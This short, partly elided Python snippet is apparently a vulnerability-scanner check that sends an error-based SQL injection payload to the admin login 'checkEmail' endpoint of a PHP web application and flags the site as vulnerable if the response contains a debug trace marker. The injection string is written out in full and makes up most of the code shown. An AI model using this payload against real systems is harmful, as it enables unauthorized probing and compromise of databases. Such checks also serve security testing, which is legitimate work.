...
def check(target):
    ...
    p_target = target
    target = target+'/index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=%27+AND+%28SELECT+2578+FROM%28SELECT+COUNT%28%2A%29%2CCONCAT%280x71706b6b71%2C%28SELECT+%28ELT%282578%3D2578%2C1%29%29%29%2C0x7162627671%2CFLOOR%28RAND%280%29%2A2%29%29x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x%29a%29--+xmVt'
    headers = {
    ...
    try:
        ...
        text = response.text
        if response.status_code == 200 and 'id="trace"' in response.text:
